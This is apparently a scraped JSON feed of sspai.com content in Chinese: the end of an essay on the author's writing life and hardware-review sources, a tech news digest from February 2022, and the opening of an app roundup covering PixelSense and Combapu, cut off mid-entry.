12900HK 能够在许多方面战胜 M1 Max，但是目前来看，我们还不知道新一代架构在轻薄本 —— 也就是大众最能够体验到的笔记本产品 —— 中的具体表现。</p>\n<ul><li><a href=\"https://www.theverge.com/2022/1/31/22906891/intel-12th-gen-alder-lake-mobile-laptop-chips-msi-ge76-raider-video\" target=\"_blank\">Intel takes a bite out of Apple</a></li></ul>\n<p>此外，The Verge 的文字评测也值得一读，可以学到不少有关评测结构的知识。一篇硬件评测的基本方面、如何排序、如何组织语言，都可以从中略知一二。The Verge 还会在评测中给出评分和最终的结论，方便购买选择时参考的同时，也为我写文章提供了一些新的想法和角度。例如，我在写 Surface Laptop Go 的测评时，就参考了 The Verge 的这篇测评，这也让我对自己手里这台笔记本有了更多的了解。</p>\n<ul><li><a href=\"https://www.theverge.com/21512680/microsoft-surface-laptop-go-review-price-specs-features\" target=\"_blank\">Surface Laptop Go review: a case study in cost cutting</a></li></ul>\n<h4><a href=\"http://notebookcheck.net/\" target=\"_blank\">Notebook Check</a></h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c7t9n2db34ta988752f0.png\"></figure><p>如果说 WIRED 和 The Verge 还都比较偏数字生活（从这个意义上说，更「少数派」），那么 Notebook Check 则是实打实的「用数据说话」。一般来说，如果我在写作的过程中需要了解一款产品（尤其是笔记本）内部使用的是哪些型号的零部件，以及它们的具体性能，甚至它们在同类硬件中的相对位置，那么 Notebook Check 是我最信赖的消息来源。这家网站不仅仅有针对整台笔记本、电脑或者平板的精细评测，也可以从具体的 CPU 和 GPU 型号来对不同厂家的电脑硬件进行比较。如果是对数字比较敏感，或者是感觉「没看到具体数字就不够客观」，这家网站的确能够提供十分全面精准的硬件性能信息，并且通过大量对比的方式呈现数据（比如 CPU 和 GPU 的天梯图），可以说是「数据党」的福音了。</p>\n<p><strong>拓展阅读</strong></p>\n<ul>\n<li><a href=\"https://www.notebookcheck.net/Microsoft-Surface-Laptop-Go-Review-An-Overpriced-Netbook.498859.0.html\" target=\"_blank\">Microsoft Surface Laptop Go Review: An Overpriced Netbook</a></li>\n<li><a href=\"https://www.notebookcheck.net/Mobile-Processors-Benchmark-List.2436.0.html\" target=\"_blank\">Mobile Processors - Benchmark List</a></li>\n</ul>\n<h4><a href=\"http://anandtech.com/\" target=\"_blank\">AnandTech</a></h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c7t9n2lb34taavnbb3eg.png\"></figure><p>AnandTech 以其硬核的硬件评测而出众，可以说硬核得甚至有点「朴素」。AnandTech 的评测通常分为许多页面，不同的页面上有着测评的不同部分，我们可以点击快速跳转到自己关心的部分。此外，AnandTech 的测评通常十分「深度」，当时针对 M1 SoC 的介绍与测评文章，应该是我看到过的最为详细，解释也最复杂的，可以说是大开眼界了。如果想要了解最新、最硬核的有关电子消费品的测评信息，AnandTech 是不能错过的。</p>\n<p><strong>拓展阅读</strong></p>\n<ul>\n<li><a href=\"https://www.anandtech.com/show/17024/apple-m1-max-performance-review\" target=\"_blank\">Apple's M1 Pro, M1 Max SoCs Investigated: New Performance and Efficiency Heights</a></li>\n<li><a href=\"https://www.anandtech.com/show/16252/mac-mini-apple-m1-tested\" target=\"_blank\">The 2020 Mac Mini Unleashed: Putting Apple Silicon M1 To The Test</a></li>\n</ul>\n<h2>总结我过去的写作</h2>\n<p>如果打开我的 <a href=\"https://kostya.club/\" target=\"_blank\">博客</a> 和 <a href=\"https://www.sspai.com/u/kostya/updates\" target=\"_blank\">少数派主页</a>，会发现自己拿来下笔的生活素材无非是这几种：</p>\n<ul>\n<li>买了新的硬件、下载了新的软件，分享自己的使用体验；</li>\n<li>吃了好吃的东西，玩了一些好玩的地方，记录下自己当时的心情；</li>\n<li>对某些事情有一些自己的了解，写出指导性的文章和信息供大家参考评阅。</li>\n</ul>\n<p>其实每种类型的文章有其不同的写作目标与写作方式，或许我能从中总结出一些可用的经验来，作为日后写作努力的方向和遵守的原则。</p>\n<h3>硬件测评与软件体验</h3>\n<ul>\n<li>主观体验 + 客观实际</li>\n<li>个人需求 + 大众需求</li>\n</ul>\n<p>每次接到硬件、软件测评体验类的文章邀约，或者是自己买了什么新的硬件或者下载了什么新的软件，我考虑的<strong>第一个问题总是</strong>：它满足了什么样的需求？我为什么会购买（下载）这款产品？因此，我常常在文章的开头会写上我个人的需求与期待。</p>\n<p>这是因为，在做出购买决策的时候，实际上需求是在第一位考虑的。除了客观上的功能参数，是否能够满足需求、满足什么样的需求，也是十分重要的。这里的需求可能有很多种：从实用的对于硬件、软件性能、功能的需求，到个人主观上的对于审美乃至虚荣一类的心理需求，其实都是我们在买一样东西之前所需要考虑的。这些需求，我也都会一并写到自己的测评体验类文章中，并且试图说明所测评的硬件或者软件，如何满足需求，以及满足需求的程度如何。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c7t9n2tb34taatkrl01g.png\"><figcaption>Surface Laptop</figcaption></figure><p>例如，<a href=\"https://sspai.com/post/70988\" target=\"_blank\">Surface Laptop Go</a> 尽管难以满足我在硬件性能上的最高需求，但是在其他许多方面都可以满足我的心理需求（例如：重量、外观、手感等等），这些都是我在测评时需要着重介绍的要点。除此之外，我也会利用详细的性能参数等更为客观的标准，对产品进行评价。毕竟，尽管我自己的需求得到了满足，我的读者仍然需要更为客观的标准去判断一款产品是否能够符合他们的需求。</p>\n<p>我认为，只从主观出发进行评价，或者只从客观进行评价，在硬件、软件的测评体验中，是绝对不可取的。主观体验和客观实际在这类文章中需要做到互相支持。其实，最近越来越多的人<a href=\"https://sspai.com/post/70994\" target=\"_blank\">强调</a>「去工具论」，认为效率和使用何种工具的关系不大；人们如何去使用工具、工具如何能够满足人的需求，才是决定效率最重要的因素。这也是我在测评体验类的文章中所想要强调的：<strong>无论其他人多么吹捧一款工具 / 一款硬件，只有适合你的，才是最好的。</strong></p>\n<h3>生活兴趣</h3>\n<ul><li>主观体验最为重要</li></ul>\n<p>如果是生活兴趣类的文章，那么实实在在地把主观体验记录下来，是最重要的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c7t9n35b34taavnbb3f0.jpeg\"></figure><p>至于我个人的体验是否能吸引其他人，并不重要 —— 写作的目的不是软文，而是要突出个人体验。正因为如此，体验中无论是好的还是坏的，我都会毫无保留地写出来。这一点，在今年突发奇想写出的《<a href=\"https://sspai.com/post/68920\" target=\"_blank\">人在北京，想吃汉堡</a>》中有所体现。在两个星期的时间里，我造访了北京城差不多 10 家汉堡店，在每一家汉堡店点了我觉得会好吃的汉堡 —— 尽管最后仍然是不免踩坑，但正是这种主观体验的经历，才是此类文章中最重要，也是最有价值的东西。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c7t9n3db34taavnbb3fg.png\"></figure><p>相比之下，《<a href=\"https://sspai.com/post/68415\" target=\"_blank\">城市漫游指南｜魂断莫斯科</a>》要更为「严肃」。尽管我每年都会有针对莫斯科的「回忆杀」时刻，但是将其写成近万字的综合性长文，是我从未想过的。不过也好，以后翻出来这篇文章的时候，我便能回想起之前在莫斯科生活的点点滴滴，记忆也因此不会被磨灭 —— 更加重要的是，由于有不少读者读过这篇文章，<strong>我的记忆也成为了这些读者的记忆</strong>。</p>\n<p>写生活兴趣一类的文章，我认为最重要的可能莫过于<strong>真实</strong>。真实的记忆、真实的体验是这类文章能够最终写得下去并且成型的关键所在，更是打动读者、与其产生共鸣的基础。若不是亲身走过莫斯科的大街小巷，见识过那里的风土人情，又怎么可能写得出洋洋洒洒的一篇文章呢？</p>\n<p>生活本身，<strong>可能有 90% 是普通和无聊的</strong> —— 但是，如何在这种无边无际的普通与无聊之中找到自己想要的、热爱的并且持之以恒，这是我记录自己生活点滴的初衷，也是我尝试新鲜事物的动力。</p>\n<h3>教程 / 小技巧</h3>\n<ul>\n<li>客观实际最为重要</li>\n<li>需要面面俱到</li>\n<li>如何兼顾有趣与足够的信息量 —— 可以尝试问题导向</li>\n</ul>\n<p>最后一类文章可能看起来比较枯燥无味，因为它们平铺直叙，充满术语和微小的细节，很难用一种有趣的方式展开。去年 10 月左右参与了少数派《iOS 15 系统指南》这一付费系列的写作，写作的目标是「有趣」「易懂」，但是我个人觉得，在自己负责的 iPadOS 部分，<strong>目标似乎远未达成</strong>。尽管在我看来，此类文章，客观实际最为重要，同时要兼顾各种情况 —— 但是如何在顾及上面两点的同时做到有趣易懂，这可能真的值得研究一番，也是我在接下来写作中可能要努力的方向之一。</p>\n<p>在这个方面，我比较欣赏 <a href=\"https://sspai.com/u/a5xddvxl/updates\" target=\"_blank\">玉树芝兰</a> 老师的作品。他也经常会写一些教程类的文章作品，但是是以一种启发式的口吻写作，而非平铺直叙 —— 一般来说，他的文章使用第二人称，通常会先抛出一两个问题作为开头的引子，之后以一种循序渐进的方式解答这个问题，整个过程中通常不断使用设问句型推进文章的主线。</p>\n<p>例如文章《<a href=\"https://sspai.com/post/71093\" target=\"_blank\">卡片笔记太多，回忆不起来？快用人工智能帮你自动找寻关联</a>》中，从「卡片太多」谈起，作者自然而然引入了「效率和记忆容量」的问题。此后，他再提出不同的人解决这个问题的方案，最后提出自己的解决方式 —— 利用人工智能自动计算文本近似度，从而寻找卡片之间的关联。实际上，整篇文章针对 <strong>操作</strong> 本身的叙述并不算多，<strong>思考</strong> 和 <strong>解决问题的方式</strong> 才是重点。不过，文章很好的平衡了不同读者的需求 —— 有些读者可能需要的是步骤，有些读者需要的是背后解决问题的方式 —— 各取所需即可。可以说，这是我理想中的教程，但是我目前水平有限，真的很难写出来。</p>\n<h2>写作如何融入我的生活？</h2>\n<h3>喧闹，市井，咖啡香</h3>\n<p>如今回想起来，我的一大半稿子可能是在咖啡馆里面写出来的。也正因为如此，我算是摸清了几乎每家连锁咖啡店的套路：<strong>哪里有插座、哪里比较安静、哪家门店人通常比较少、什么时段的人最少</strong>……尽管听起来十分 cliche，但是咖啡馆的确有这种神奇的魔力，能够让我在相对嘈杂的环境中集中注意力在自己的文字产出上不分心。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c7t9n3tb34taavnbb3g0.jpeg\"></figure><p>可能这也是为什么我到了一个新的地方之后，最喜欢的莫过于先去探索一下当地的咖啡馆。不仅仅是为了咖啡，也是为了一种奇妙的氛围，让我能够以一种最为放松的状态去记录自己当下的生活与体验。咖啡馆的嘈杂本身倒不是什么特别能够打扰到我的东西 —— 我其实挺害怕完完全全的安静的，周遭有一些人声反而能够让我更加专注于眼前所写的东西。</p>\n<p>如果要问我常点什么咖啡，不如看看 <a href=\"https://sspai.com/post/67915\" target=\"_blank\">这篇文章</a>。不过，最近的我倒是迷上了冷萃咖啡。冷萃咖啡本身的魅力，可能就在于它浓郁的香气，以及与普通的意式咖啡并不相同的醇厚口感。冷萃，加上冰块（不额外加水），就成了我在咖啡馆最常点的饮料，提神醒脑的同时，也能体会咖啡本身的苦味在口中渐渐转化为香气和回甘。</p>\n<h3>趁手的写作工具</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c7t9n4db34ta988752fg.jpeg\"></figure><p><strong>在咖啡馆写作</strong>，我的写作工具必然是一台移动设备。之前我会经常用 iPad Pro，最近也经常用 Surface Laptop Go。移动写作意味着我所携带的设备并非需要在性能上有多么优越，更需要的是优秀的便携性、续航，以及舒适的输入体验。iPad Pro 和 Surface Laptop Go 在一般情况下都还算可以满足以上两点要求，同时成本也在我可以接受的范围内。值得一提的是，iPad Pro（搭配妙控键盘）和 Surface Laptop Go 都有很舒服的键盘，以及易用的触控板 —— 大部分时候我无需使用其他输入方式（例如触摸）就可以完成所有的操作。</p>\n<p><strong>在家写作</strong>，我的写作工具则是一把 HHKB 键盘搭配 Mac mini（M1，2020）。我一直以来都很喜欢 HHKB 键盘回弹的手感，以及它紧凑的布局。我的 HHKB 是 Professional 2 Type S，因此在音量上并不算大，不会有其他机械键盘那种非常夸张的敲键音。Mac mini 的可靠性自然不用说，可以没有任何压力轻松应付从码字到修图再到简单的视频剪辑这一系列的工作流程，只恨不能随身携带。</p>\n<h3>和朋友、编辑、任何人讨论</h3>\n<p><strong>写作，其实从来都不是一个人的事</strong>。尽管我很喜欢一个人在不受干扰的环境中完成写作，但是其实写作中所需要的观点和灵感不可能完全来自自己。已经数不清有多少次，我是在和朋友的聊天中、在和编辑们的插科打诨中、甚至是在评论区和读者讨论的过程中，迸发出了新点子，写成了新的文章。和他们的聊天、讨论通常总是可以打开我的视野，为写作提供新鲜的角度。</p>\n<p>例如，写《<a href=\"https://sspai.com/post/68224\" target=\"_blank\">开学季｜证多不压身，聊聊大学里值得「拼一拼」的证书考试</a>》的时候，和朋友坐下来花了几个小时细数了几种不同资格考试的形式、内容以及难度，甚至还翻朋友圈八卦了周围的同学、朋友通过这些考试的情况。另外，题目本身是编辑 Tp 提出的，我写之前其实并没有太大的信心，还是他给了我不少鼓励。</p>\n<p>此外，也十分感谢这一年来和我有许多交集的各位少数派编辑们。我有时候的确会有点「鸽」，要不是各位编辑及时的催稿，我可能也不会在上个月正式突破百万的文章总阅读量。和其中的几位编辑，除了写作「公事公办」之外，我们私下里也会时常交流 —— 分享听了什么歌、看了什么电影，有什么好吃的好玩的，甚至也会约出来吃饭 —— 可能这才是 Matrix 能被称作是「<strong>社区</strong>」的真谛吧？我能够坚持写作，自身兴趣之外，这种独特的归属感也是强大的动力。</p>\n<h2>没有写作的生活，早已无法想象</h2>\n<p>我还记得，五年前，自己第一次参加少数派年度总结征文的时候，标题是「成为数字生活的分享者」。尽管标题这么写了，当时的自己其实还尚未意识到，在少数派我能够收获多少；还尚未理解，为何写作可以成为一种生活方式。而现在，每逢周末，我就会背上自己的电脑，到或近或远的咖啡馆坐下，喝一杯咖啡，开始写下或多或少的文字。可能不是每个字都会让大家看见 —— 但是写作已经成为了一种习惯，成为了我定义自己的方式。</p>\n<p>似乎没有写作的生活，我早已无法想象。</p>\n<p><i>本文参与少数派 2021 年度征文「生活 21」赛道。</i></p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\" target=\"_blank\">客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，找到数字时代更好的生活方式 🎊</p>\n<p>&gt; 年度回顾、好物推荐…… 更多精彩尽在 <a href=\"http://sspai.com/page/2021\" target=\"_blank\">少数派 2021 年度盘点</a> 🎉</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/71272"},{"title":"派早报：Surface Laptop Studio 国行开始预售、微信车载版已支持 15 家汽车厂商等","date":"2022-02-15 00:56:31","description":"\n<h2>你可能错过的新鲜事</h2>\n<h3>Surface Laptop Studio 国行开始预售</h3>\n<p>2 月 14 日，微软官方商城宣布 Surface Laptop Studio 即日起开启预售。该设备配备了 14.4 英寸 120Hz PixelSense 触摸屏，搭载了英特尔第 11 代 H 系列四核处理器，最高搭载 NVIDIA RTX 3050Ti GPU 显卡、32GB 内存和 2TB 存储。续航方面，设备常规使用下可以维持 19 小时，并搭配 Thunderbolt 4 技术的 USB 4.0 端口。衔接部位采用了动态编织铰链，方便用户快速进行三种模式的切换。产品售价 12188 元起。<a href=\"https://www.microsoftstore.com.cn/surface/surface-laptop-studio?Icid=ZHCN_SurfaceCategory_product01_surfacelaptopstudio_202202\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c85fbbdb34ta98875ti0.jpeg\"></figure><h3>微信车载版已支持 15 家汽车厂商</h3>\n<p>近日，微信官网更新「微信车载版」相关页面。据官网信息，微信车载版将主要通过语音方式进行交互，不需要点触操作应用。在开车场景中，用户可以始终专注驾驶本身。除此之外，也可以通过方向盘按键操作，驾驶者可以快速唤醒微信车载版，便捷播报、回复消息，接听、挂断语音通话，保证双手不离开方向盘的情况下安全地与好友沟通。微信车载版暂只支持汽车出厂时已完成适配微信车载版的相关车辆，不支持单独下载安装。目前已有 15 家汽车厂商接入，包括奥迪、宝马、北京、长安、长城、理想、丰田等。<a href=\"https://car.weixin.qq.com/#/detail\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c85fbblb34ta98875tig.jpeg\"></figure><h3>微软将停止对旧版本 Visual Studio 的支持</h3>\n<p>近日，微软官方在博客中发布公告，最迟将于 2023 年 1 月前取消对 Visual Studio 2012、Visual Studio 2017、Visual Studio 2019 预览频道的支持，并强烈建议用户更新至去年最新发布的 Visual Studio 2022 。<a href=\"https://devblogs.microsoft.com/visualstudio/support-ends-for-older-versions-of-visual-studio-feb2022/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c85fbbtb34taavnbbt10.jpeg\"></figure><h3><strong>AMD 宣布完成对赛灵思的收购</strong></h3>\n<p>AMD 于 2 月 14 日宣布完成对赛灵思的收购，正式成为集 CPU、GPU、FPGA 于一身的芯片巨头。前赛灵思董事会成员 Jon Olson 和 Elizabeth Vanderslice 已加入 AMD 董事会。赛灵思股东将以每股赛灵思普通股换取 1.7234 股 AMD 普通股，赛灵思普通股将不再在纳斯达克股票市场上市交易。此前 AMD 于 2020 年 10 月 27 日宣布以全股票交易方式收购赛灵思，当时据路透社报道称收购价格为 498 亿美元。<a href=\"https://www.ithome.com/0/602/971.htm\" target=\"_blank\">来源</a></p>\n<h3><strong>索尼推出 SRS-RA5000 旗舰级高解析度蓝牙音箱</strong></h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c85fbc5b34taavnbbt1g.png\"></figure><p>索尼于 2 月 14 日正式发布旗舰级高解析度蓝牙音箱 SRS-RA5000 和高音质蓝牙音箱 SRS-RA3000，其中 SRS-RA5000 采用 7 个扬声器组合，搭载了进阶版的 S-Master HX 数字放大器技术以及 DSEE HX 数字声音增强引擎；SRS-RA3000 则采用 80mm 的发声单元，支持索尼 S-Master 数字放大器技术以及 DSEE 数字声音增强引擎。两款音箱均支持 3.5mm 有线连接、蓝牙连接以及 Qplay，SRS-RA5000 还支持 NFC 快速连接。目前两款音箱已上架索尼官网，RA5000 售价 4499 元，RA3000 售价 2499 元，开售时间暂未确定。<a href=\"https://www.ithome.com/0/602/913.htm\" target=\"_blank\">来源</a></p>\n<h3><strong>《新蝙蝠侠》确认引进中国内地</strong></h3>\n<p>DC 电影官方微博于 2 月 14 日正式宣布，旗下的电影新作《新蝙蝠侠》将正式引进至内地，目前尚未公布正式档期。《新蝙蝠侠》是由马特·里夫斯执导的超级英雄电影，由罗伯特·帕丁森、杰弗里·怀特、佐伊·克拉维兹、保罗·达诺等联袂主演，讲述了蝙蝠侠深入哥谭市地下世界，调查名流被谋杀案真相的故事。消息称《新蝙蝠侠》全长 175 分钟。<a href=\"https://www.ithome.com/0/602/931.htm\" target=\"_blank\">来源</a></p>\n<h2>看看就行的小道消息</h2>\n<ul>\n<li>借助 Android 13 DP1 中出现的 KVM 虚拟机，XDA 开发者 kdrag0n 在 Pixel 6 上成功运行了完整版 Windows 11。<a href=\"https://twitter.com/kdrag0n/status/1492754683445669893\" target=\"_blank\">来源</a>\n</li>\n<li>据外媒 MacRumors 报道，Apple 目前已向欧亚经济委员会数据库中提交了三款新的 Mac 电脑型号，分别为 A2615、A2686 和 A2681，这三款设备或将在 3 月 8 日的春季发布会上发布。<a href=\"https://www.macrumors.com/2022/02/14/apple-files-new-macs-ahead-spring-event/\" target=\"_blank\">来源</a>\n</li>\n</ul>\n<h2>少数派的近期动态</h2>\n<ul>\n<li>🎁 少数派 iOS 客户端<a href=\"https://itunes.apple.com/cn/app/id1191720421?mt=8\" target=\"_blank\">重大更新</a>，<a href=\"https://apps.apple.com/cn/app/id1191720421?eventid=6442693454\" target=\"_blank\">「派读」功能新鲜上线</a>，为你打造量身定制的内容拼盘。</li>\n<li>📕 <a href=\"https://sspai.com/prime/precog/techod-0x09\" target=\"_blank\">科技漫游第 0x09 期</a> 正在更新，学学如何<a href=\"https://sspai.com/prime/story/shortcuts-blood-pressure-monitering\" target=\"_blank\">用快捷指令帮家人记录血压</a>，更有 <a href=\"https://sspai.com/prime/story/charles-sina-lottery-tutorial\" target=\"_blank\">Charles 抓包实战</a>。</li>\n<li>🎇 会员通讯 <a href=\"https://sspai.com/prime/precog/vol015-pre-moving-forward\" target=\"_blank\">第 15 期</a> 上线，带你了解 <a href=\"https://sspai.com/prime/story/vol015-talk-about-background-check\" target=\"_blank\">工作背景调查</a>、建立 <a href=\"https://sspai.com/prime/story/vol015-how-to-take-smart-notes\" target=\"_blank\">写作工作流</a>、线下 <a href=\"https://sspai.com/prime/story/vol015-ebook-or-physical-book\" target=\"_blank\">读书找书</a> 等。</li>\n<li>☕ 少数派报告《<a href=\"https://sspai.com/prime/precog/specialty-coffee-report\" target=\"_blank\">精品咖啡入门指南</a>》已上线，从相对硬核的咖啡豆种、处理法、烘焙法到大家关心的器材和冲煮攻略，都在这里啦！</li>\n</ul>\n<h2>你可能错过的文章</h2>\n<ul>\n<li>📃 <a href=\"https://sspai.com/post/71294\" target=\"_blank\">用一张价值 3000 元的纸是什么感受？这是我的 reMarkable 2 体验</a>\n</li>\n<li>🚗 <a href=\"https://sspai.com/post/71421\" target=\"_blank\">不买可以先收藏 10：选对行车记录仪，和路上的「麻烦」坦然交手</a>\n</li>\n<li>👀 <a href=\"https://sspai.com/post/71409\" target=\"_blank\">少数派 App 大更新，我们为你准备了一份专属内容拼盘：派读</a>\n</li>\n<li>⭐ <a href=\"https://sspai.com/post/71434\" target=\"_blank\">派评 | 近期值得关注的 App</a>\n</li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/71451"},{"title":"派评 | 近期值得关注的 App","date":"2022-02-14 09:50:24","description":"\n<p>情人节快乐，本期《派评》的主要内容有：</p>\n<ul>\n<li>📖 少数派 App 大更新，用「派读」为你送上专属内容拼盘。</li>\n<li>📷PixelSense：又一款全能型 iOS / iPadOS 修图工具。</li>\n<li>🏠 Combapu：你的家务专属待办工具。</li>\n<li>📅 老牌日历工具 Fantastical 更新，会议日程安排更加完善。</li>\n<li>……</li>\n</ul>\n<p>你可以通过文章目录快速跳转到你感兴趣的内容。如果发现了其它感兴趣的 App 或者关注的话题，也欢迎在评论区和我们进行讨论。</p>\n<h2>不容错过的新 App</h2>\n<p>虽然少数派一直在为大家发发现和介绍各平台上的优质 App，但仍有不少设计、功能、交互、体验都非常优秀的 App，还没有被我们发掘和介绍。它们可能是一款老 App，也可能是近期上架的新 App，我们会在这里介绍给你。</p>\n<h3>PixelSense：你的第 N+1 款「全能」修图应用</h3>\n<ul>\n<li>平台：iOS / iPadOS</li>\n<li>关键词：修图、图像编辑</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@Snow\" user-id=\"bs2od75b34tch2730o80\" href=\"https://sspai.com/u/ul0vcezb\">@Snow</a>：iOS 平台已经有非常多成熟的全能型修图应用，比如 <a href=\"https://sspai.com/search/post/Lightroom\" target=\"_blank\">Lightroom</a>、<a href=\"https://sspai.com/search/post/Pixelmator\" target=\"_blank\">Pixelmator</a>、<a href=\"https://sspai.com/search/post/Snapseed\" target=\"_blank\">Snapseed</a>、<a href=\"https://sspai.com/app/%E6%B3%BC%E8%BE%A3%E4%BF%AE%E5%9B%BE\" target=\"_blank\">泼辣修图</a> 等等，滤镜调色、剪裁变换只是基本素养，它们各自有着不同的「操作上限」，局部调整、色彩曲线、畸变校正、画面修复、超分辨率什么的都不在话下。</p>\n<p>今天推荐的第 N+1 款全能修图应用 PixelSense 其实算我们的老朋友了，源于同一开发者的全能修图应用 <a href=\"https://sspai.com/post/47104\" target=\"_blank\">Fine</a> 可以看作它的小屏优化版吧。PixelSense 最初仅上线 iPadOS 平台，但估计是随着手机性能的提升和 UI 优化，它也和 <a href=\"https://sspai.com/post/70709\" target=\"_blank\">Pixelmator Photo</a> 一样多线合并，来到了 iOS 平台。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c8523mlb34taatkrlq1g.png\"></figure><p>Fine 的功能其实已经非常多样化了，全面的调色功能，自定义虚化效果，丰富的畸变校正方式，笔刷式的局部调节，此外还内置了多款贴图、海报和边框模板，以及各种艺术化效果。PixelSense 则是在这基础了做了一些体现「专业性」的加减法，首先是曲线工具，Fine 仅支持 RGB 曲线调节，PixelSense 则支持 RGB 曲线、 Lab 曲线、CMYK 曲线、色调以及饱和度曲线 5 类曲线调节，而且你可以用吸管吸取画面某一点的元素，在曲线中做出对应标记，调节方式也会更为直观。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c8523mtb34taavnbbs5g.jpeg\"></figure><p>Fine 中的景深工具需要你先选择效果，然后通过径向、水平向或是笔刷框选虚化范围，虽然也可以通过智能按钮识别，但要精细操作总体还是比较麻烦。PixelSense 的景深体验更为直观，点击画面中任一点，应用便会将其标记为对焦区域，其余识别为前景或背景的元素都会被虚化处理，在处理期间你可以随时更改焦点位置和虚化效果，还可以调节前后景不同的虚化程度。如果你想更精细地处理，依旧可以调用笔刷工具细致描绘。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c8523n5b34taatkrlq20.jpeg\"></figure><p>局部调节是 PixelSense 相比 Fine 第三项重点优化的功能，它将 Fine 在景深功能中的智能识别移到了这里，这一功能会自动识别画面中的各类元素（虽然不太准确，但能在一定程度上框定不同元素的边界区域），你可以直接选择某一画面元素进行调节，当然也可以通过笔刷绘制选定区域。PixelSense 在画面调节项中还加入了 LUT 功能，你可以自行导入 Cube 预设来实现更具个性化的调色效果。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c8523ndb34taavnbbs60.jpeg\"></figure><p>在此基础上，PixelSense 还增加了与 <a href=\"https://sspai.com/app/Pixelmator%20Photo\" target=\"_blank\">Pixelmator Photo</a> 相似的超分辨率处理，名为「AI 增强」，最高支持放大 4 倍分辨率，同样也支持降噪效果，其中的光照增强相当于更保守的智能修图，可在一定程度上提升画面通透感。不过 PixelSense 只能支持 1200W 分辨率以下的图片进行超分，这一点显然不如 Pixelmator Photo。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c8523nlb34taatkrlq2g.jpeg\"></figure><p>或许是为体现专业性，PixelSense 砍掉了 Fine 所有「花里胡哨」的贴图、模板和艺术化效果，却又额外加入了「天空替换」功能，这波操作我倒是有些没看明白。它内置了超过 100 款天空效果，还支持手工导入天空素材。体验下来，蓝天、多云、黄昏、日出这类素材适配性相对较强，星空和极光总体比较突兀。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c8523ntb34ta98875si0.jpeg\"></figure><p>虽然是从 iPadOS 迁移而来，PixelSense 在 iPhone 上的横屏效果却存在严重 bug，完全无法使用。另外，景深功能或许是因算法较为复杂，经常性出现「转菊花」的情况，无法载入所有功能按钮，希望开发者可以尽快优化。</p>\n<p>全能型修图应用这么多，在我看来 PixelSense 的主要优势除了功能的全面性，更在于图片元素的智能识别，搭配直观的操作界面，修图会更加方便。PixelSense 的 AI 增强、局部调节、景深处理都需付费之后才可使用。你可以按每月 12 元或每年 78 元订阅，或是支付 158 元买断。买断价格虽算不上「天花板」，但也不便宜，何况对于一般用户来说，其实并不需要用到全部的复杂功能。如果你对我刚才说的优势比较在意，可以先按月订阅试用一下，再决定是否购买。</p>\n<span class=\"ss-application\" app-id=\"16343\"> </span><h3>Combapu：让家务像待办事项那样有条不紊</h3>\n<ul>\n<li>平台：Android</li>\n<li>关键词：生活、家务、待办事项</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@Noah_Choi\" user-id=\"bs2oudlb34tch2787tn0\" href=\"https://sspai.com/u/69zxdqx8\">@Noah_Choi</a>：打工人每天都在奋斗，下班回家总是满身疲惫，只想躺在床上昏睡过去，哪还有精力做日常清扫呢？所以很多人都选择在周末进行大扫除。不过即使有扫拖机器人等自动化产品为我们解放双手，但还是有不少积攒了一个周的家务工作需要我们去做。</p>\n<p>面对这么多繁杂的家务，我们可以利用 Combapu 这款 App 让家务变得有条不紊。Combapu 可以看做是一个专门面向家务卫生工作的 To-Do 应用。它的应用图标很有趣，乍一看像是一位中世纪骑士，可仔细端详你就会发现，这位骑士手里握着的竟然是一把扫帚（也可能是地板擦）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c8523o5b34taavnbbs6g.png\"></figure><p>使用之前，用户需要根据自己家庭的实际分布，以「房间」为单位建立清单，如果是合租单间的同学，也可以像任务分解一样，把自己房间分割成多个部分，比如书桌、衣橱、床铺等区域来规划打扫周期。新建房间时，Combapu 提供了许多预设房间，当然了，你也可以自定义房间名称。Combapu 已经为每个预设房间都拟定了符合其场景的家务项目，例如在浴室房间里，我们可以看到清理镜子、清理浴缸或花洒、更换淋浴帘等；卧室场景里则会给出更换床品、吸尘、整理衣柜等家务工作。</p>\n<figure class=\"image ss-img-wrapper\"><img 